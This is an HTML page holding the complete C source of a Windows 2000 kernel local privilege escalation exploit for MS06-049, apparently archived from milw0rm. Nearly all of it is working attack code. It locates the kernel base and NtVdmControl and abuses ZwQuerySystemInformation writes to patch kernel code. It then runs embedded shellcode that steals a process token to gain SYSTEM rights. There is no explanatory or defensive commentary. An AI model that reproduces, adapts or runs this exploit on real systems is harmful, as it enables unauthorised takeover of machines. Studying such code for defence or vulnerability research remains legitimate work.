<html><head><title>MS Windows (Windows Kernel) Privilege Escalation Exploit (MS06-049)</title></head><pre>/*
    MS06-049 Windows ZwQuerySystemInformation Local Privilege Escalation Vulnerability Exploit
            Created by SoBeIt

    Main file of exploit

    Tested on:

    Windows 2000 PRO SP4 Chinese
    Windows 2000 PRO SP4 Rollup 1 Chinese
    Windows 2000 PRO SP4 English
    Windows 2000 PRO SP4 Rollup 1 English

    Usage:ms06-049.exe
*/

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#define NTSTATUS    int
#define ProcessBasicInformation    0
#define SystemModuleInformation 11
    
typedef NTSTATUS (NTAPI *ZWVDMCONTROL)(ULONG, PVOID);
typedef NTSTATUS (NTAPI *ZWQUERYINFORMATIONPROCESS)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);

ZWVDMCONTROL    ZwVdmControl;
ZWQUERYINFORMATIONPROCESS    ZwQueryInformationProcess;
ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;

typedef struct _PROCESS_BASIC_INFORMATION {
      NTSTATUS ExitStatus;
      PVOID PebBaseAddress;
      ULONG AffinityMask;
      ULONG BasePriority;
      ULONG UniqueProcessId;
      ULONG InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT Unknow;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    char ImageName[256];    
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

unsigned char kfunctions[64][64] = 
{
                            //ntoskrnl.exe
    {&quot;ZwTerminateProcess&quot;},
    {&quot;&quot;},
};

unsigned char shellcode[] = 
        &quot;\x90\x60\x9c\xe9\xd1\x00\x00\x00\x5f\x4f\x47\x33\xc0\x66\x81\x3f&quot;
        &quot;\x90\xcc\x75\xf6\x40\x40\x66\x81\x3c\x07\xcc\x90\x75\xec\x83\xc7&quot;
        &quot;\x04\xbe\x38\xf0\xdf\xff\x8b\x36\xad\xad\x48\x81\x38\x4d\x5a\x90&quot;
        &quot;\x00\x75\xf7\x95\x8b\xf7\x6a\x01\x59\xe8\x56\x00\x00\x00\xe2\xf9&quot;
        &quot;\xbb\x24\xf1\xdf\xff\x8b\x1b\x8b\x43\x44\xb9\x08\x00\x00\x00\xe8&quot;
        &quot;\x2c\x00\x00\x00\x8b\xd0\x8b\x4e\x04\xe8\x22\x00\x00\x00\x8b\x8a&quot;
        &quot;\x2c\x01\x00\x00\x89\x88\x2c\x01\x00\x00\x56\x8b\x7e\x0c\x8b\x4e&quot;
        &quot;\x10\x8b\x76\x08\xf3\xa4\x5e\x33\xc0\x50\x50\xff\x16\x9d\x61\xc3&quot;
        &quot;\x8b\x80\xa0\x00\x00\x00\x2d\xa0\x00\x00\x00\x39\x88\x9c\x00\x00&quot;
        &quot;\x00\x75\xed\xc3\x51\x56\x8b\x75\x3c\x8b\x74\x2e\x78\x03\xf5\x56&quot;
        &quot;\x8b\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5\x33\xdb\x0f\xbe&quot;
        &quot;\x10\x85\xd2\x74\x08\xc1\xcb\x07\x03\xda\x40\xeb\xf1\x3b\x1f\x75&quot;
        &quot;\xe7\x5e\x8b\x5e\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e\x1c\x03\xdd&quot;
        &quot;\x8b\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\x2a\xff\xff\xff\x90\x90&quot;

        &quot;\x90\xcc\xcc\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x90\x90\xcc&quot;;

void ErrorQuit(char *msg)
{
    printf(&quot;%s:%x\n&quot;, msg, GetLastError());
    ExitProcess(0);
}

ULONG ComputeHash(char *ch)
{
    ULONG ret = 0;

    while(*ch)
    {
        ret = ((ret &lt;&lt; 25) | (ret &gt;&gt; 7)) + *ch++;
    }

    return ret;
}

ULONG RVA2Offset(ULONG RVA, PIMAGE_SECTION_HEADER pSectionHeader, ULONG Sections)
{    
    ULONG i;
    
    if(RVA &lt; pSectionHeader[0].PointerToRawData)
        return RVA;

    for(i = 0; i &lt; Sections; i++)
    {   
        if(RVA &gt;= pSectionHeader[i].VirtualAddress &amp;&amp;
           RVA &lt; pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData)           
           return (RVA - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData);
    }
    
    return 0;
}

ULONG Offset2RVA(ULONG Offset, PIMAGE_SECTION_HEADER pSectionHeader, ULONG Sections)
{   
    ULONG i;
    
    if(Offset &lt; pSectionHeader[0].PointerToRawData)
        return Offset;
    
    for(i = 0; i &lt; Sections; i++)
    {
        if(Offset &gt;= pSectionHeader[i].PointerToRawData &amp;&amp;
           Offset &lt; pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData)
           return (Offset - pSectionHeader[i].PointerToRawData + pSectionHeader[i].VirtualAddress);
    }
    
    return 0;
}

void GetFunction()
{
    HANDLE    hNtdll;
    
    hNtdll = LoadLibrary(&quot;ntdll.dll&quot;);
    if(hNtdll == NULL)
        ErrorQuit(&quot;LoadLibrary failed.\n&quot;);
        
    ZwVdmControl = (ZWVDMCONTROL)GetProcAddress(hNtdll, &quot;ZwVdmControl&quot;);
    if(ZwVdmControl == NULL)
        ErrorQuit(&quot;GetProcAddress failed.\n&quot;);
        
    ZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)GetProcAddress(hNtdll, &quot;ZwQueryInformationProcess&quot;);
    if(ZwQueryInformationProcess == NULL)
        ErrorQuit(&quot;GetProcAddress failed.\n&quot;);
        
    ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, &quot;ZwQuerySystemInformation&quot;);
    if(ZwQuerySystemInformation == NULL)
        ErrorQuit(&quot;GetProcessAddress failed.\n&quot;);
        
    FreeLibrary(hNtdll);
}

ULONG GetKernelBase()
{
    ULONG    i, Byte, ModuleCount;
    PVOID    pBuffer;
    PSYSTEM_MODULE_INFORMATION    pSystemModuleInformation;
    PCHAR    pName;
    
    ZwQuerySystemInformation(SystemModuleInformation, (PVOID)&amp;Byte, 0, &amp;Byte);
        
    if((pBuffer = malloc(Byte)) == NULL)
        ErrorQuit(&quot;malloc failed.\n&quot;);
        
    if(ZwQuerySystemInformation(SystemModuleInformation, pBuffer, Byte, &amp;Byte))
        ErrorQuit(&quot;ZwQuerySystemInformation failed\n&quot;);
    
    ModuleCount = *(PULONG)pBuffer;
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)((PUCHAR)pBuffer + sizeof(ULONG));
    for(i = 0; i &lt; ModuleCount; i++)
    {
        if((pName = strstr(pSystemModuleInformation-&gt;ImageName, &quot;ntoskrnl.exe&quot;)) != NULL)
        {
            free(pBuffer);    
            return (ULONG)pSystemModuleInformation-&gt;Base;
        }
        
        pSystemModuleInformation++;
    }
        
    free(pBuffer);
    return 0;
}

int main(int argc, char *argv[])
{
    PULONG    pStoreBuffer, pNamesArray, pFunctionsArray, pShellcode, pRestoreBuffer;
    PUCHAR    pBase;
    PCHAR        pName;
    PUSHORT        pOrdinals;
    PIMAGE_NT_HEADERS    pHeader;
    PIMAGE_EXPORT_DIRECTORY    pExport;
    PIMAGE_SECTION_HEADER pSectionHeader;
    PROCESS_BASIC_INFORMATION pbi;
    SYSTEM_MODULE_INFORMATION    smi;
    char        DriverName[256];
    ULONG        Byte, FileSize, len, i, j, k, Count, BaseAddress, Value, KernelBase, buf[64], HookAddress, Temp, Sections;
    USHORT    index;
    HANDLE    hDevice, hFile, hFileMap;

    printf(&quot;\n MS06-049 Windows ZwQuerySystemInformation Local Privilege Escalation Vulnerability Exploit \n\n&quot;);
    printf(&quot;\t Create by SoBeIt. \n\n&quot;);
    if(argc != 1)
    {
        printf(&quot; Usage:%s \n\n&quot;, argv[0]);
        return 1;
    }

    GetFunction();

    if(ZwQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, (PVOID)&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL))
        ErrorQuit(&quot;ZwQueryInformationProcess failed\n&quot;);
    
    KernelBase = GetKernelBase();
    if(!KernelBase)
        ErrorQuit(&quot;Unable to get kernel base address.\n&quot;);
        
    printf(&quot;Kernel base address: %x\n&quot;, KernelBase);

    pRestoreBuffer = malloc(0x100);
    if(pRestoreBuffer == NULL)
        ErrorQuit(&quot;malloc failed.\n&quot;);
    
    pStoreBuffer = VirtualAlloc(NULL, 0x1001000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(pStoreBuffer == NULL)
        ErrorQuit(&quot;VirtualAlloc failed.\n&quot;);
        
    printf(&quot;Allocated address:%x\n&quot;, pStoreBuffer);
    
    if(!GetSystemDirectory((PUCHAR)pStoreBuffer, 256))
        ErrorQuit(&quot;GetSystemDirectory failed.\n&quot;);

    strcat((PUCHAR)pStoreBuffer, &quot;\\ntoskrnl.exe&quot;);
    hFile = CreateFile((PUCHAR)pStoreBuffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        hFile = CreateFile(&quot;ntoskrnl.exe&quot;, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if(hFile == INVALID_HANDLE_VALUE)
            ErrorQuit(&quot;CreateFile failed.\n&quot;);
    }

    if((FileSize = GetFileSize(hFile, NULL)) == 0xffffffff)
        ErrorQuit(&quot;GetFileSize failed.\n&quot;);

    printf(&quot;File size:%x\n&quot;, FileSize);
    pBase = (PUCHAR)VirtualAlloc(NULL, FileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(pBase == NULL)
        ErrorQuit(&quot;VirtualAlloc failed.\n&quot;);
        
    if(!ReadFile(hFile, pBase, FileSize, &amp;Byte, NULL))
        ErrorQuit(&quot;ReadFile failed.\n&quot;);

    pHeader = (PIMAGE_NT_HEADERS)(pBase + ((PIMAGE_DOS_HEADER)pBase)-&gt;e_lfanew);
    pSectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)(&amp;pHeader-&gt;OptionalHeader) + pHeader-&gt;FileHeader.SizeOfOptionalHeader);
    Sections= pHeader-&gt;FileHeader.NumberOfSections;

    pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + 
        RVA2Offset(pHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,
        pSectionHeader,
        Sections
        ));

    pNamesArray = (PULONG)(pBase + 
                    RVA2Offset(pExport-&gt;AddressOfNames,
                        pSectionHeader,
                        Sections));
                        
    pFunctionsArray = (PULONG)(pBase +                        
                    RVA2Offset(pExport-&gt;AddressOfFunctions,
                        pSectionHeader,
                        Sections));
                        
    pOrdinals = (PUSHORT)(pBase + 
                    RVA2Offset(pExport-&gt;AddressOfNameOrdinals,
                        pSectionHeader,
                        Sections));
                        
    len = strlen(&quot;NtVdmControl&quot;);
    for(i = 0; i &lt; pExport-&gt;NumberOfNames; i++)
    {
        pName = pBase + RVA2Offset(pNamesArray[i], pSectionHeader, Sections);
        if(!strncmp(pName, &quot;NtVdmControl&quot;, len))
            break;
    }

    if(i &gt; pExport-&gt;NumberOfFunctions)
        ErrorQuit(&quot;Some error occured.\n&quot;);

    index = pOrdinals[i]; 
    HookAddress = pFunctionsArray[index] + KernelBase;
    memcpy((PUCHAR)pRestoreBuffer, pBase + pFunctionsArray[index] - 1, 0x10);
    printf(&quot;%s Address:%x\n&quot;, &quot;NtVdmControl&quot;, HookAddress);
    
    pShellcode = (PULONG)shellcode;
    for(k = 0; pShellcode[k++] != 0x90cccc90; )
                ;

    for(j = 0; kfunctions[j][0] != '\x0'; j++)
        buf[j] = ComputeHash(kfunctions[j]);

    buf[j++] = pbi.InheritedFromUniqueProcessId;
    buf[j++] = (ULONG)pRestoreBuffer;
    buf[j++] = HookAddress - 1;
    buf[j++] = 0x10;    

    memcpy((char *)(pShellcode + k), (char *)buf, j * 4);
    
    Temp = 0;
    for(i = 0; i &lt; 7; i++)
    {
        ZwQuerySystemInformation(SystemModuleInformation, (PVOID)&amp;Byte, 0, &amp;Byte);
        Byte = Byte / sizeof(SYSTEM_MODULE_INFORMATION);
        Temp += Byte;
    }
    
    Byte = Temp / 7;
    printf(&quot;Single value:%x\n&quot;, Byte);
    Value = (0xe9 &lt;&lt; 8) &amp; 0xff00;
    printf(&quot;Jump value:%x\n&quot;, Value);
    printf(&quot;Base value:%x\n&quot;, pRestoreBuffer[0]);
    for(Count = 0; ; Count++)
    {
        if(((pRestoreBuffer[0] + Count * Byte) &amp; 0xff00) == Value)
            break;    
    }
    
    printf(&quot;Need value generated:%x\n&quot;, pRestoreBuffer[0] + Count * Byte);
    printf(&quot;Count value:%x\n&quot;, Count);
    for(i = 0; i &lt; Count; i ++)
        ZwQuerySystemInformation(SystemModuleInformation, (PVOID)(HookAddress - 1), 0, &amp;Byte);

    Temp = 0;
    for(i = 0; i &lt; 7; i++)
    {
        ZwQuerySystemInformation(SystemModuleInformation, (PVOID)&amp;Byte, 0, &amp;Byte);
        Byte = Byte / sizeof(SYSTEM_MODULE_INFORMATION);
        Temp += Byte;
    }
    
    Byte = Temp / 7;
    printf(&quot;Single value:%x\n&quot;, Byte);
    Value = (((ULONG)pStoreBuffer + 0x800000 - HookAddress) &gt;&gt; 16) &amp; 0xfff0;
    printf(&quot;Jump value:%x\n&quot;, Value);
    printf(&quot;Base value:%x\n&quot;, pRestoreBuffer[1]);
    for(Count = 0; ; Count++)
    {
        if(((pRestoreBuffer[1] + Count * Byte) &amp; 0xfff0) == Value)
            break;
    }

    printf(&quot;Need value generated:%x\n&quot;, pRestoreBuffer[1] + Count * Byte);
    printf(&quot;Count value:%x\n&quot;, Count);
    for(i = 0; i &lt; Count; i ++)
        ZwQuerySystemInformation(SystemModuleInformation, (PVOID)(HookAddress + 3), 0, &amp;Byte);

    memset(pStoreBuffer, 0x90, 0x1001000);
    memcpy((PUCHAR)pStoreBuffer + 0x1000000, shellcode, sizeof(shellcode));
        
    CloseHandle(hFile);

    printf(&quot;Exploitation finished.\n&quot;);
    ZwVdmControl(0, NULL);
    
    return 1;
}

// milw0rm.com [2006-09-21]</pre></html>